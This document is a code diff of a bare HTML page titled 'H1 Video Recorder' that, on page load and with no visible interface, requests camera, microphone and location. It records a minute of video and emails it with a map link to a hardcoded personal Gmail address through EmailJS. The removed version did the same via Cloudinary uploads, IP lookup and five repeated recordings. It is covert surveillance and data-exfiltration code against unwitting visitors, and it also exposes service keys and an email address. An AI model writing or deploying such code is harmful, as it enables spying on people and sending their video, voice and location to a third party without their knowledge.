@@ -3,103 +3,84 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>H1 Video Recorder</title>
+  <title>H1 Video Recorder with Location</title>
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    // Your EmailJS and Cloudinary config:
-    const serviceID = "service_khmk344";
-    const templateID = "template_oyrsayr";
-    const publicKey = "ACOn6PC1Zb70JrmxT";
+    // Initialize EmailJS with your public key
+    emailjs.init("ACOn6PC1Zb70JrmxT");
 
-    const cloudName = "dymxlqxxx";
-    const uploadPreset = "unsigned_video_uploads";
-
-    emailjs.init(publicKey);
-
-    // Fetch public IP
-    async function getUserIP() {
+    async function startRecording() {
       try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        if (!res.ok) throw new Error("Failed to fetch IP");
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return "IP not available";
-      }
-    }
+        // Request camera + mic access
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-    // Upload video blob to Cloudinary and return the URL
-    async function uploadToCloudinary(blob) {
-      const formData = new FormData();
-      formData.append("file", blob);
-      formData.append("upload_preset", uploadPreset);
+        // Request location access & get position (optional)
+        let latitude = null;
+        let longitude = null;
 
-      const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/upload`, {
-        method: "POST",
-        body: formData,
-      });
-      if (!res.ok) throw new Error("Cloudinary upload failed");
-      const data = await res.json();
-      return data.secure_url;
-    }
+        if (navigator.geolocation) {
+          try {
+            const position = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
+            });
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
+          } catch (locErr) {
+            console.warn("Location permission denied or error:", locErr.message);
+            // proceed without location
+          }
+        }
 
-    // Send email with video URL and IP address
-    async function sendEmail(videoUrl, ip) {
-      return emailjs.send(serviceID, templateID, {
-        to_email: "julianlee252@gmail.com",
-        message: `Here’s your 1-minute video recording from IP: ${ip}\nWatch it here: ${videoUrl}`
-      });
-    }
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
 
-    // Record one minute video, upload and send email
-    async function recordAndSend() {
-      return new Promise(async (resolve, reject) => {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          const recorder = new MediaRecorder(stream);
-          let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
 
-          recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const reader = new FileReader();
 
-          recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: "video/webm" });
-            chunks = [];
-            stream.getTracks().forEach((track) => track.stop());
+          reader.onloadend = function() {
+            const base64data = reader.result.split(',')[1];
 
-            try {
-              const videoUrl = await uploadToCloudinary(blob);
-              const ip = await getUserIP();
-              await sendEmail(videoUrl, ip);
-              resolve();
-            } catch (err) {
-              reject(err);
+            let locationMessage = "Location not provided.";
+            if (latitude !== null && longitude !== null) {
+              locationMessage = `Location: https://maps.google.com/?q=${latitude},${longitude}`;
             }
+
+            emailjs.send("service_khmk344", "template_oyrsayr", {
+              to_email: "julianlee252@gmail.com",
+              message: `Here’s your 1-minute video recording.\n\n${locationMessage}`
+            }, {
+              attachments: [{
+                name: "recording.webm",
+                data: base64data
+              }]
+            }).then(() => {
+              console.log("✅ Video email sent!");
+            }).catch(error => {
+              console.error("❌ EmailJS error:", error);
+            });
           };
 
-          recorder.start();
-          setTimeout(() => recorder.stop(), 60000); // 1 minute
-        } catch (err) {
-          reject(err);
-        }
-      });
-    }
+          reader.readAsDataURL(blob);
+        };
 
-    // Main function to record 5 videos sequentially
-    async function main() {
-      for (let i = 1; i <= 5; i++) {
-        try {
-          await recordAndSend();
-          console.log(`✅ Video ${i} sent successfully`);
-        } catch (err) {
-          console.error(`❌ Error with video ${i}:`, err);
-          break;
-        }
+        recorder.start();
+
+        setTimeout(() => {
+          recorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 60000); // 1 minute
+
+      } catch (err) {
+        console.error("Permission denied or error:", err);
       }
     }
 
-    window.onload = main;
+    window.onload = startRecording;
   </script>
 </body>
 </html>
